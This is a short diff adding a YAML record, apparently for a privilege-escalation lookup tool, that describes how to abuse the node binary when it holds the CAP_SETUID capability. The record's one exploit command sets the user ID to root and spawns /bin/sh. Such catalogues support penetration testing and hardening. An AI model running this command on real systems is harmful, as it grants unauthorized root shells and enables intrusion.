@@ -1,0 +1,7 @@
+name: node
+binary_path: /usr/bin/node
+exploit_cmds:
+- '/usr/bin/node -e ''process.setuid(0); require("child_process").spawn("/bin/sh",
+  {stdio: [0, 1, 2]})'''
+required_caps:
+- CAP_SETUID
